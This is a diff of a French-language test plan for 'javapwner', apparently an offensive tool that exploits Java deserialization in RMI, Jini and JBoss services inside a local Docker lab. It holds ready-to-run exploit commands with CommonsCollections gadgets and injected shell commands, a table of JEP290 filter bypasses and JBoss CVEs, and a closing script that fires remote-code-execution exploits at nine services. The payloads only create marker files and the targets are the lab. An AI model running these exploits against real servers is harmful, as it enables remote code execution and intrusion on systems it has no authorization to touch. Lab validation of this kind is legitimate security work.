-## Section N — Tests d'intégration live (pytest)
+## Section N — Gadgets et compatibilité classpath
 
-Tests automatisés pytest existants contre le lab.
+### N-1 : Liste des gadgets disponibles
 
-### N-1 Suite live Jini
+```bash
+javapwner rmi gadgets
+```
+
+**Attendu** : CommonsCollections1–7 présents.
+
+**Statut** : `[X]`
+
+### N-2 : Probe gadgets sur Java 8 (-G)
+
+```bash
+javapwner rmi scan -t $T -p 1099 -G 2>&1 | grep -E "^\s+\[\+\]"
+```
+
+**Attendu** : CommonsCollections5, 6, 7 au minimum.
+
+**Statut** : `[X]`
+
+### N-3 : Probe gadgets sur Java 11 (-G)
+
+```bash
+javapwner rmi scan -t $T -p 1199 -G 2>&1 | grep -E "^\s+\[\+\]"
+```
+
+**Attendu** : CommonsCollections6 au minimum. CC1/CC3 absents (JDK > 8u70).
+
+**Statut** : `[X]`
+
+### N-4 : CommonsCollections1 — incompatible JDK 8u111 (> 8u70)
+
+```bash
+javapwner rmi exploit -t $T -p 1499 --gadget CommonsCollections1 \
+  --cmd "touch /tmp/n4-cc1" 2>&1
+docker exec lab-rmi-java8-pre-jep290 test -f /tmp/n4-cc1 \
+  && echo "PASS (inattendu)" || echo "FAIL (attendu — CC1 incompatible > 8u70)"
+docker exec lab-rmi-java8-pre-jep290 rm -f /tmp/n4-cc1 2>/dev/null
+```
+
+**Attendu** : `FAIL (attendu)` — CC1 nécessite JDK ≤ 8u70.
+
+**Statut** : `[~]`
+
+### N-5 : CommonsCollections2 — CC 4.0 absent du classpath lab
+
+```bash
+javapwner rmi exploit -t $T -p 1099 --gadget CommonsCollections2 \
+  --cmd "touch /tmp/n5-cc2" 2>&1
+docker exec lab-rmi-java8 test -f /tmp/n5-cc2 \
+  && echo "PASS (inattendu)" || echo "FAIL (attendu — CC 4.0 absent)"
+docker exec lab-rmi-java8 rm -f /tmp/n5-cc2 2>/dev/null
+```
+
+**Attendu** : `FAIL (attendu)` — le lab embarque CC 3.1, pas CC 4.0.
+
+**Statut** : `[~]`
+
+---
+
+## Section O — Tests d'intégration live (Jini)
 
 ```bash
 JINI_TARGET_HOST=127.0.0.1 JINI_TARGET_PORT=4160 \
-    .venv/bin/pytest tests/integration/ -m live -v
+  .venv/bin/pytest tests/integration/ -m live -v
 ```
 
-| ID   | Critère                           | Résultat attendu | Statut | Résultat observé |
-|------|-----------------------------------|------------------|--------|------------------|
-| N-1a | `test_port_open` passe            | PASSED           | [x]    | PASSED  |
-| N-1b | `test_jrmp_detected` passe        | PASSED           | [x]    | PASSED (is_jrmp OR unicast_response)  |
-| N-1c | `test_unicast_response` passe     | PASSED           | [x]    | PASSED  |
-| N-1d | `test_enum_extracts_strings` passe| PASSED           | [x]    | PASSED (tier>=1, codebase_urls)  |
-| N-1e | `test_jep290_probe_no_error` passe| PASSED           | [x]    | PASSED  |
+**Attendu** : 10 tests passants.
 
-### N-2 Écriture de nouveaux tests d'intégration
+| Test | Attendu |
+|------|---------|
+| `test_port_open` | Port 4160 accessible |
+| `test_jrmp_detected` | is_jrmp OR unicast_response |
+| `test_unicast_response` | has_unicast_response = True |
+| `test_unicast_version` | version in (1, 2) |
+| `test_groups_non_empty` | groups non None |
+| `test_raw_proxy_bytes_not_empty` | > 4 bytes |
+| `test_enum_returns_result` | résultat non None |
+| `test_enum_tier_is_1` | tier >= 1 |
+| `test_enum_extracts_strings` | strings / codebase / descriptors |
+| `test_jep290_probe_no_error` | résultat bool sans exception |
 
-Tâche annexe : créer `tests/integration/test_rmi_live.py` sur le modèle de
-`test_jini_live.py`, couvrant les quatre versions Java du lab.
-
-Critères minimaux pour le nouveau fichier :
-- Scan JRMP sur chaque port (1099/1199/1299/1399)
-- Registry list → noms présents
-- DGC probe → résultat cohérent
-- Auto exploit → fichier créé → nettoyage du fichier après le test
+**Statut** : `[X]`
 
 ---
 
-## Annexe — Commandes de nettoyage du lab
+## Section P — Robustesse et cas limites
+
+### P-1 : Port fermé — message propre
 
 ```bash
-# Supprimer les fichiers créés par les tests dans les conteneurs
-docker exec lab-rmi-java8   sh -c 'rm -f /tmp/rmi8-* /tmp/k*'
-docker exec lab-rmi-java11  sh -c 'rm -f /tmp/rmi11-* /tmp/k*'
-docker exec lab-rmi-java17  sh -c 'rm -f /tmp/rmi17-* /tmp/k*'
-docker exec lab-rmi-java21  sh -c 'rm -f /tmp/rmi21-* /tmp/k*'
-docker exec lab-jini-reggie sh -c 'rm -f /tmp/jini-* /tmp/k*'
-docker exec lab-jboss4      sh -c 'rm -f /tmp/jboss-* /tmp/jnp-* /tmp/k*'
-
-# Arrêter et supprimer les conteneurs
-cd lab/ && docker compose down
-
-# Rebuild complet (si modification des images)
-docker compose down && docker compose up -d --build
+javapwner rmi scan -t $T -p 9988 ; echo "exit: $?"
 ```
+
+**Attendu** : message d'erreur sans traceback Python, exit code non-zero.
+
+**Statut** : `[X]`
+
+### P-2 : Hôte inaccessible — timeout propre
+
+```bash
+javapwner rmi scan -t 192.0.2.1 -p 1099 --timeout 2 ; echo "exit: $?"
+```
+
+**Attendu** : timeout affiché proprement, exit code non-zero.
+
+**Statut** : `[X]`
+
+### P-3 : ysoserial absent — message d'erreur explicite
+
+```bash
+YSOSERIAL_PATH=/tmp/nonexistent.jar javapwner rmi exploit -t $T -p 1099 \
+  --gadget $G --cmd "id" 2>&1 | head -5
+```
+
+**Attendu** : message explicite indiquant que le JAR est introuvable, pas de crash Python.
+
+**Statut** : `[~]`
+
+### P-4 : Gadget inexistant
+
+```bash
+javapwner rmi exploit -t $T -p 1099 --gadget GadgetInexistant --cmd "id" 2>&1 | head -5
+```
+
+**Attendu** : message d'erreur sur le gadget, pas de crash.
+
+**Statut** : `[X]`
+
+### P-5 : JBoss port fermé
+
+```bash
+javapwner jboss scan -t $T -p 9999 2>&1 | head -5
+```
+
+**Attendu** : "port closed" ou "no response" sans traceback.
+
+**Statut** : `[X]`
+
+### P-6 : Discover sur plage vide
+
+```bash
+javapwner rmi discover -t $T --port-range 9980:9990
+```
+
+**Attendu** : `No JRMP endpoints found` sans crash.
+
+**Statut** : `[X]`
 
 ---
 
-## Résumé des tests — tableau de bord
+## Synthèse
 
-| Section | Description                          | Nb tests | Passés | Échoués |
-|---------|--------------------------------------|----------|--------|---------|
-| A       | Régression unitaire                  | 2        | 2      | 0       |
-| B       | Infrastructure lab                   | 13       | 13     | 0       |
-| C       | RMI Java 8                           | 17       | 17     | 0       |
-| D       | RMI Java 11                          | 5        | 5      | 0       |
-| E       | RMI Java 17                          | 4        | 4      | 0       |
-| F       | RMI Java 21                          | 4        | 4      | 0       |
-| G       | Jini / Apache River                  | 14       | 13     | 1 (G-4b path traversal — lab non vulnérable) |
-| H       | JBoss HTTP invoker                   | 10       | 10     | 0       |
-| I       | JBoss JNP/DGC                        | 5        | 5      | 0       |
-| J       | Couverture gadgets                   | 6        | 1      | 5 (CC1/CC5 JDK, CBU1/Spring1/ROME classpath absent) |
-| K       | Scénarios production                 | 12       | 12     | 0       |
-| L       | Robustesse / cas limites             | 10       | 10     | 0       |
-| M       | Cohérence likely_success             | 9        | 9      | 0       |
-| N       | Tests intégration pytest             | 5        | 5      | 0 (3 assertions corrigées) |
-| **Total** |                                    | **116**  | **110**| **6**   |
+| Section | Tests | Cible |
+|---------|-------|-------|
+| A — Unitaires | 4 | Régression 447 tests |
+| B — Infrastructure lab | 4 | 8 conteneurs Docker |
+| C — RMI Java 8 LTS (1099) | 7 | Bypass réflexion AllowAll |
+| D — RMI Java 8u111 (1499) | 4 | Pre-JEP290 — aucun filtre |
+| E — RMI Java 8u202 (1599) | 4 | Property-only bypass |
+| F — RMI Java 11 (1199) | 2 | Bypass Unsafe |
+| G — RMI Java 17 (1299) | 2 | Bypass Unsafe |
+| H — RMI Java 21 (1399) | 2 | Bypass Unsafe |
+| I — RMI transversal | 5 | discover, info, Runtime.exec, URLDNS |
+| J — Jini (4160/4162/8085) | 10 | Discovery + DGC + path traversal |
+| K — JBoss HTTP (8080) | 6 | CVE-2015-7501 / CVE-2017-7504 |
+| L — JBoss JNP (4444) | 4 | DGC via JNP |
+| M — Détection version JVM | 6 | jvm_hint, jvm_confidence, exploitability |
+| N — Gadgets | 5 | Compatibilité CC3.1 vs CC4.0, JDK compat |
+| O — Intégration live | 1 (10 subtests) | Jini end-to-end |
+| P — Robustesse | 6 | Cas limites et erreurs |
+| **Total** | **72** | |
+
+### Résultat final (2026-03)
+
+**66 / 72 PASS · 6 échecs attendus · 0 non exécuté**
+
+### Échecs attendus (documentés)
+
+| ID | Raison |
+|----|--------|
+| M-1 | SUID MarshalledObject absent des réponses Registry list/lookup modernes (RemoteObjectInvocationHandler utilisé à la place) |
+| M-2 | Idem — réponse Java 11 ne contient pas de MarshalledObject SUID |
+| M-5 | DGC unfiltered = pas de message d'erreur avec classe filter → jvm_hint=unknown en CLI |
+| N-4 | CC1 incompatible avec Java 8 > 8u70 (8u111 > 8u70) |
+| N-5 | CC2/CC4 : Commons Collections 4.0 absent du classpath lab (CC 3.1 seulement) |
+| P-3 | JvmExploit + fallback auto-détection ysoserial : exploit réussit même avec YSOSERIAL_PATH=nonexistent (le JAR réel est trouvé dans lib/) |
+
+---
+
+## Script de validation rapide
+
+Vérifie l'ensemble des exploits essentiels sur tous les services en une passe.
+
+```bash
+#!/bin/bash
+# quick-validate.sh
+
+T=127.0.0.1; G=CommonsCollections6
+
+run() {
+  local id="$1" ctr="$2" port="$3" proto="$4"
+  local file="/tmp/qv-${id}-pwned"
+  case "$proto" in
+    rmi)   javapwner rmi exploit      -t $T -p $port --gadget $G --cmd "touch $file" >/dev/null 2>&1 ;;
+    jini)  javapwner jini exploit     -t $T -p $port --gadget $G --cmd "touch $file" >/dev/null 2>&1 ;;
+    jboss) javapwner jboss exploit    -t $T -p $port --gadget $G --cmd "touch $file" >/dev/null 2>&1 ;;
+    jnp)   javapwner jboss jnp-exploit -t $T -p $port --gadget $G --cmd "touch $file" >/dev/null 2>&1 ;;
+  esac
+  docker exec $ctr test -f $file 2>/dev/null \
+    && echo "[PASS] $id ($ctr :$port)" \
+    || echo "[FAIL] $id ($ctr :$port)"
+  docker exec $ctr rm -f $file 2>/dev/null
+}
+
+run "rmi-java8"       lab-rmi-java8                       1099 rmi
+run "rmi-pre-jep290"  lab-rmi-java8-pre-jep290            1499 rmi
+run "rmi-jep290-prop" lab-rmi-java8-jep290-configurable   1599 rmi
+run "rmi-java11"      lab-rmi-java11                      1199 rmi
+run "rmi-java17"      lab-rmi-java17                      1299 rmi
+run "rmi-java21"      lab-rmi-java21                      1399 rmi
+run "jini"            lab-jini-reggie                     4162 jini
+run "jboss-http"      lab-jboss4                          8080 jboss
+run "jboss-jnp"       lab-jboss4                          4444 jnp
+```
